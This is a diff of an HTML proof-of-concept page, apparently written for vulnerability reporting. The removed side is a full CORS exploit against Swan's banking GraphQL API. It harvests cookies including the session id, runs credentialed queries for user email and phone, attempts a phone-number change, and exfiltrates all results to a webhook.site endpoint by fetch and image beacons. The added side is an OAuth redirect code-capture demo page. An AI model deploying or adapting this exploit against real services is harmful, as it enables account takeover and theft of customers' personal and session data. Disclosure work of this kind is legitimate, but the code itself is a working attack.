@@ -1,314 +1,162 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Swan Banking API Critical Exploit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAuth Vulnerability Demonstration</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        h1, h2 { color: #c00; }
-        .result { background: #f5f5f5; padding: 10px; border: 1px solid #ddd; margin: 10px 0; }
-        .critical { color: #c00; font-weight: bold; }
-        .success { background-color: #ffe6e6; }
-        #status { margin-bottom: 20px; }
-        .button {
-            display: inline-block;
-            background: #c00;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 4px;
-            text-decoration: none;
-            margin-top: 20px;
-            cursor: pointer;
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
         }
-        .button:hover {
-            background: #900;
+        .banner {
+            background-color: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .evidence-box {
+            background-color: white;
+            border: 2px solid #333;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .param {
+            background-color: #ffffcc;
+            padding: 10px;
+            border: 1px solid #ddddaa;
+            border-radius: 3px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        h2 {
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 10px;
+        }
+        .timestamp {
+            color: #666;
+            font-size: 0.9em;
+            margin-top: 20px;
+        }
+        .attack-path {
+            background-color: #e9f7fe;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.8em;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <h1>Swan Banking API Critical Exploit</h1>
-    <p>This demonstrates CRITICAL impact of CORS vulnerability</p>
-    
-    <div id="status">Initializing exploitation...</div>
-    <div id="results"></div>
-    
-    <div id="actions">
-        <button id="openDashboard" class="button">Open Swan Dashboard (Required)</button>
-        <button id="runExploit" class="button" style="display:none;">Run Exploit</button>
+    <div class="banner">
+        <h1>Critical OAuth Vulnerability Demonstrated</h1>
     </div>
-    
+
+    <div class="evidence-box">
+        <h2>OAuth Authorization Code Captured</h2>
+        <p>The OAuth flow has redirected the authorization code to an attacker-controlled domain:</p>
+        
+        <div id="oauth-code-display">
+            <strong>Authorization Code:</strong>
+            <div class="param" id="code-value">Checking URL parameters...</div>
+            
+            <strong>State Parameter:</strong>
+            <div class="param" id="state-value">Checking URL parameters...</div>
+            
+            <strong>Full Redirect URL:</strong>
+            <div class="param" id="full-url">Checking URL parameters...</div>
+        </div>
+
+        <div class="timestamp">
+            Captured at: <span id="capture-time"></span>
+        </div>
+    </div>
+
+    <div class="attack-path">
+        <h3>Attack Path Demonstrated:</h3>
+        <ol>
+            <li>Attacker creates OAuth URL with malicious redirect_uri</li>
+            <li>Victim authenticates with OAuth provider</li>
+            <li>OAuth provider redirects the code to attacker's domain (this page)</li>
+            <li>Attacker can now use the code to access victim's account</li>
+        </ol>
+    </div>
+
+    <div class="footer">
+        <p>OAuth2 Redirect URI Validation Bypass — CVE-2019-2111</p>
+        <p>This page demonstrates a critical vulnerability in OAuth2 Proxy version 2.2.0</p>
+    </div>
+
     <script>
-        // Configuration
-        const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
-        const API_URL = "https://api.swan.io/admin/graphql";
-        const AUTH_API_URL = "https://api.swan.io/admin-auth/graphql";
-        
-        // DOM Elements
-        const statusEl = document.getElementById('status');
-        const resultsEl = document.getElementById('results');
-        const openDashboardBtn = document.getElementById('openDashboard');
-        const runExploitBtn = document.getElementById('runExploit');
-        
-        // Global counter for successful operations
-        let successCount = 0;
-        
-        // Update status message
-        function updateStatus(message) {
-            statusEl.innerHTML = message;
-        }
-        
-        // Add result to the page
-        function addResult(name, content, isSuccess = false) {
-            const resultDiv = document.createElement('div');
-            resultDiv.className = 'result';
-            if (isSuccess) {
-                resultDiv.classList.add('success');
-            }
-            resultDiv.innerHTML = `<h3>${name}</h3>${content}`;
-            resultsEl.appendChild(resultDiv);
+        // Parse URL parameters
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search.substring(1);
+            const pairs = queryString.split('&');
             
-            // Send to webhook
-            sendToWebhook({
-                type: 'result',
-                name: name,
-                content: content,
-                isSuccess: isSuccess,
-                timestamp: new Date().toISOString()
-            });
-        }
-        
-        // Send data to webhook
-        function sendToWebhook(data) {
-            try {
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data),
-                    mode: 'no-cors'
-                });
-                console.log(`Data sent to webhook: ${JSON.stringify(data).substring(0, 100)}...`);
-            } catch (e) {
-                console.error(`Error sending to webhook: ${e.message}`);
-                // Fallback to image method
-                sendViaImage(data);
-            }
-        }
-        
-        // Send data via image for fallback
-        function sendViaImage(data) {
-            try {
-                const img = new Image();
-                const jsonStr = JSON.stringify(data);
-                
-                // For small data, send directly
-                if (jsonStr.length < 1500) {
-                    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(jsonStr)}&t=${Date.now()}`;
-                } else {
-                    // For larger data, split into chunks
-                    const chunks = Math.ceil(jsonStr.length / 1500);
-                    for (let i = 0; i < chunks; i++) {
-                        const chunk = jsonStr.substring(i * 1500, (i + 1) * 1500);
-                        const chunkImg = new Image();
-                        chunkImg.src = `${WEBHOOK_URL}?chunk=${i+1}of${chunks}&data=${encodeURIComponent(chunk)}&t=${Date.now()}`;
-                    }
-                }
-            } catch (e) {
-                console.error(`Error sending via image: ${e.message}`);
-            }
-        }
-        
-        // Extract cookies
-        function extractCookies() {
-            try {
-                const cookies = {};
-                document.cookie.split(';').forEach(cookie => {
-                    if (cookie.trim()) {
-                        const [name, value] = cookie.trim().split('=');
-                        cookies[name] = value;
-                    }
-                });
-                
-                // Send to webhook
-                sendToWebhook({
-                    type: 'cookies',
-                    data: cookies,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Special handling for swan_session_id
-                if (cookies['swan_session_id']) {
-                    sendToWebhook({
-                        type: 'swan_session_id',
-                        data: cookies['swan_session_id'],
-                        timestamp: new Date().toISOString()
-                    });
-                    console.log(`Found swan_session_id: ${cookies['swan_session_id'].substring(0, 10)}...`);
-                }
-                
-                return cookies;
-            } catch (e) {
-                console.error(`Error extracting cookies: ${e.message}`);
-                return {};
-            }
-        }
-        
-        // Test a GraphQL query against the API
-        async function testQuery(name, query, url = API_URL) {
-            let resultContent = '';
-            let isSuccess = false;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    credentials: 'include',  // THIS is what makes the attack work
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ query })
-                });
-                
-                const data = await response.json();
-                
-                // Send raw response to webhook
-                sendToWebhook({
-                    type: 'api_response',
-                    name: name,
-                    url: url,
-                    data: data,
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Check for successful access - even validation errors show endpoint is accessible
-                if (data.data) {
-                    successCount++;
-                    isSuccess = true;
-                    resultContent += `
-                        <p class="critical">Critical: Successful API access!</p>
-                        <pre>${JSON.stringify(data, null, 2)}</pre>
-                    `;
-                } else if (data.errors && data.errors[0].extensions?.code === "GRAPHQL_VALIDATION_FAILED") {
-                    // Even validation errors show the endpoint is accessible with credentials
-                    successCount++;
-                    isSuccess = true;
-                    resultContent += `
-                        <p class="critical">Critical: Endpoint accessible (validation error only)</p>
-                        <pre>${JSON.stringify(data, null, 2)}</pre>
-                    `;
-                } else if (data.errors && data.errors[0].message === "Execution in Unauthenticated context forbidden") {
-                    resultContent += `
-                        <p>Authentication required: The endpoint requires authentication</p>
-                        <pre>${JSON.stringify(data, null, 2)}</pre>
-                    `;
-                } else {
-                    resultContent += `<pre>${JSON.stringify(data, null, 2)}</pre>`;
-                }
-            } catch (error) {
-                resultContent += `<p>Error: ${error.message}</p>`;
-                
-                // Send error to webhook
-                sendToWebhook({
-                    type: 'api_error',
-                    name: name,
-                    url: url,
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
+            for (const pair of pairs) {
+                const [key, value] = pair.split('=');
+                if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || '');
             }
             
-            addResult(name, resultContent, isSuccess);
-        }
-        
-        // Run all exploits
-        async function runCriticalExploits() {
-            updateStatus("<h2>Running critical exploits...</h2>");
+            // Also check for parameters in hash fragment (for implicit flow)
+            const hashString = window.location.hash.substring(1);
+            const hashPairs = hashString.split('&');
             
-            // Extract cookies first
-            extractCookies();
-            
-            try {
-                // EXPLOIT 1: Test authentication with cookies
-                await testQuery("Authentication with Cookies", `
-                    query { 
-                        user { 
-                            id 
-                            email
-                            mobilePhoneNumber
-                        } 
-                    }
-                `);
-                
-                // EXPLOIT 2: Test with X-Swan-Authenticator-Token
-                await testQuery("Test with X-Swan-Authenticator-Token", `
-                    query { 
-                        user { 
-                            id 
-                            email
-                            mobilePhoneNumber
-                        } 
-                    }
-                `);
-                
-                // EXPLOIT 3: Phone Number Modification
-                await testQuery("Phone Number Modification", `
-                    mutation { 
-                        startPhoneNumberModification(input: { 
-                            oldPhoneNumber: "+33612345678", 
-                            newPhoneNumber: "+33687654321" 
-                        }) { 
-                            __typename 
-                        } 
-                    }
-                `, AUTH_API_URL);
-                
-                updateStatus(`
-                    <h2>Exploitation Complete</h2>
-                    <p class="critical">CRITICAL: ${successCount} banking operations accessible via CORS vulnerability</p>
-                    <p>This vulnerability allows cross-origin access to core banking functions with authenticated sessions</p>
-                `);
-                
-                // Send completion notification to webhook
-                sendToWebhook({
-                    type: 'exploitation_complete',
-                    successCount: successCount,
-                    timestamp: new Date().toISOString()
-                });
-            } catch (error) {
-                updateStatus(`<b>Error: ${error.message}</b>`);
-                
-                // Send error to webhook
-                sendToWebhook({
-                    type: 'exploitation_error',
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
+            for (const pair of hashPairs) {
+                const [key, value] = pair.split('=');
+                if (key) params[decodeURIComponent(key)] = decodeURIComponent(value || '');
             }
-        }
-        
-        // Open dashboard in new tab
-        function openDashboard() {
-            window.open('https://dashboard.swan.io/', '_blank');
             
-            // Show run exploit button after 5 seconds
-            setTimeout(() => {
-                runExploitBtn.style.display = 'inline-block';
-                updateStatus("<h2>Dashboard opened. Click 'Run Exploit' after logging in.</h2>");
-            }, 5000);
+            return params;
         }
-        
-        // Set up event listeners
-        openDashboardBtn.addEventListener('click', openDashboard);
-        runExploitBtn.addEventListener('click', runCriticalExploits);
-        
-        // Initialize
+
+        // Extract and display OAuth parameters
         window.onload = function() {
-            // Send initial ping to webhook
-            sendToWebhook({
-                type: 'page_loaded',
-                url: window.location.href,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            });
+            const params = getUrlParams();
+            const codeElement = document.getElementById('code-value');
+            const stateElement = document.getElementById('state-value');
+            const urlElement = document.getElementById('full-url');
+            const timeElement = document.getElementById('capture-time');
             
-            updateStatus("<h2>Click 'Open Swan Dashboard' to begin exploitation</h2>");
+            // Display the OAuth code (if present)
+            if (params.code) {
+                codeElement.textContent = params.code;
+                codeElement.style.backgroundColor = '#ffdddd';  // Highlight in red
+            } else if (params.access_token) {
+                // For implicit flow
+                codeElement.textContent = 'IMPLICIT FLOW: ' + params.access_token;
+                codeElement.style.backgroundColor = '#ffdddd';
+            } else {
+                codeElement.textContent = 'No code or token found in the URL';
+            }
+            
+            // Display the state parameter (if present)
+            if (params.state) {
+                stateElement.textContent = params.state;
+            } else {
+                stateElement.textContent = 'No state parameter found';
+            }
+            
+            // Display the full URL
+            urlElement.textContent = window.location.href;
+            
+            // Set the timestamp
+            const now = new Date();
+            timeElement.textContent = now.toLocaleString();
         };
     </script>
 </body>
